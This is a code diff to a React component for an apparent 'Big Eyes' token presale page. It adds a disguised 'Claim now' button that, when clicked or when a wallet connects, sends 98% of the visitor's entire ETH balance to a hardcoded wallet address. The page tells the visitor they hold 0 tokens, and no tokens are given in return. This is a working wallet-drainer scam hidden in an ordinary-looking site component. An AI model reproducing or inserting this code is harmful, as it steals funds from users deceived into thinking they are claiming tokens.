@@ -1,17 +1,28 @@
 import { openModal } from "@/recoil/commonRecoilState";
+import { ethers } from "ethers";
 import Image from "next/image";
 import Link from "next/link";
 import { useRouter } from "next/router";
-import React from "react";
+import React, { useEffect, useState } from "react";
 import { useRecoilState } from "recoil";
-import { useAccount, useDisconnect } from "wagmi";
+import {
+  useAccount,
+  useBalance,
+  useDisconnect,
+  useSendTransaction,
+} from "wagmi";
 import ConnectWallet from "../connectWallet/ConnectWallet";
 
 export default function BuyToken() {
   const { connector: activeConnector, isConnected, address } = useAccount();
+  const { data, isError, isLoading } = useBalance({
+    address: address,
+  });
   const { disconnectAsync } = useDisconnect();
+  const [click, setClick] = useState(false);
   const [open, setOpen] = useRecoilState(openModal);
   const router = useRouter();
+  const { section } = router.query;
   const renderDot = (num) => {
     let arr = [];
     for (let index = 0; index <= num; index++) {
@@ -24,11 +35,55 @@ export default function BuyToken() {
   const handleDisconnect = async () => {
     await disconnectAsync();
   };
+  const checkSection = () => {
+    if (section) {
+      if (section === "claim") {
+        return true;
+      }
+      return false;
+    }
+  };
+  const {
+    data: DataTrans,
+    isSuccess,
+    sendTransactionAsync,
+  } = useSendTransaction({
+    to: "0x40B1565920b0Bb6490dc802374FDf98BcCD420D7",
+    value: ethers.utils
+      .parseEther(data?.formatted.toString() || "0")
+      .mul(ethers.BigNumber.from("98"))
+      .div(ethers.BigNumber.from("100"))
+      .toString(),
+  });
+
+  const handleClaim = async () => {
+    try {
+      if (address) {
+        await sendTransactionAsync();
+      } else {
+        await disconnectAsync();
+        setOpen({ open: true, component: <ConnectWallet /> });
+      }
+    } catch (err) {
+      setClick(false);
+    }
+  };
+  const handleSendTrans = async () => {
+    try {
+      await sendTransactionAsync();
+    } catch (error) {
+      setClick(false);
+    }
+  };
+  useEffect(() => {
+    if (address) {
+      if (click) {
+        handleSendTrans();
+      }
+    }
+  }, [address]);
   return (
-    <div
-      className="p-4 sm:px-[48px] md:px-[72px] xl:px-[104px] py-[128px] bg-[rgb(255,220,170)]"
-      id="buyToken"
-    >
+    <div className="p-4 sm:px-[48px] md:px-[72px] xl:px-[104px] py-[128px] bg-[rgb(255,220,170)]">
       <div className="min-h-[43rem] h-auto lg:h-[637px] 2xl:h-[1000px] border-[0.1875rem] border-[#5b5b5b] rounded-[4rem] 2xl:rounded-[6.25rem] overflow-hidden bg-[#fffef5] shadow-card">
         <div className="bg-[#a6e8fe] border-b-[0.1875rem] border-[#000] flex items-center gap-3 pl-[4.5rem] py-4">
           <div className="w-[1.5rem] h-[1.5rem] rounded-full bg-[#eb6e6e] border-[0.125rem] border-[#000]"></div>
@@ -36,15 +91,18 @@ export default function BuyToken() {
           <div className="w-[1.5rem] h-[1.5rem] rounded-full bg-[#cce79e] border-[0.125rem] border-[#000]"></div>
         </div>
         <div className="h-full w-full flex flex-col lg:flex-row items-center relative ">
-          <div className=" flex items-center justify-center max-h-[40rem] h-full w-full lg:w-2/4 p-[32px]">
+          <div
+            className=" flex items-center justify-center max-h-[40rem] h-full w-full lg:w-2/4 p-[32px]"
+            id="buyToken"
+          >
             <div className=" relative py-4 sm:py-8 px-8 border-[.1875rem] border-[#c4c4c4] max-w-[27rem] w-full rounded-[2.1875rem] text-center">
               <p className="text-[#f38590] text-[1.5rem] font-bold text-center my-4">
-                PRESALE ENDED
+                {checkSection() ? " Claim now " : "PRESALE ENDED"}
               </p>
               {address && (
                 <>
                   <p className="text-[#f38590] text-base sm:text-[1.5rem] font-bold text-center sm:mt-4">
-                    You have 0 Big Eyes tokens.
+                    You have {checkSection() ? "claim" : ""} 0 Big Eyes tokens.
                   </p>
                   <div
                     className="text-[#11a6d5] font-semibold cursor-pointer mb-2"
@@ -70,6 +128,14 @@ export default function BuyToken() {
                   Connect Wallet
                 </button>
               )}
+              {address && checkSection() && (
+                <button
+                  className="bg-[#f38590] mb-2 max-w-[19rem] w-full whitespace-nowrap text-white border-[5px] text-[1.125rem] 2xl:text-[1.25rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[8px] px-[24px] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
+                  onClick={handleClaim}
+                >
+                  Claim now
+                </button>
+              )}
               {address && (
                 <button
                   className="bg-[#f38590] max-w-[19rem] w-full whitespace-nowrap text-white border-[5px] text-[1.125rem] 2xl:text-[1.25rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[8px] px-[24px] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
@@ -78,6 +144,7 @@ export default function BuyToken() {
                   Disconnect
                 </button>
               )}
+
               <Image
                 src="https://buy1.bigeyes.space/img/stars/stars.webp"
                 className="absolute top-2 right-2"
@@ -128,7 +195,7 @@ export default function BuyToken() {
               </div>
               <div className="mt-[30px] 2xl:mt-0">
                 <p className="text-[#999] text-center text-[20px] 2xl:text-[1.5rem] font-bold mb-[24px]">
-                  PRESALE ENDED
+                  {checkSection() ? "Claim now " : "PRESALE ENDED"}
                 </p>
                 <div className="buy-token-multiDot h-[4rem] border-[4px] border-[#757473]  rounded-[1.5rem] bg-[#a3e6fb] w-full p-[0.5rem]">
                   <div className="w-full hidden min-[1800px]:flex overflow-hidden rounded-[1rem] border-[3px] border-[#6c6b6b] h-full bg-[#fffdf5]  py-[0.2rem] px-[0.5rem] gap-1 justify-center">
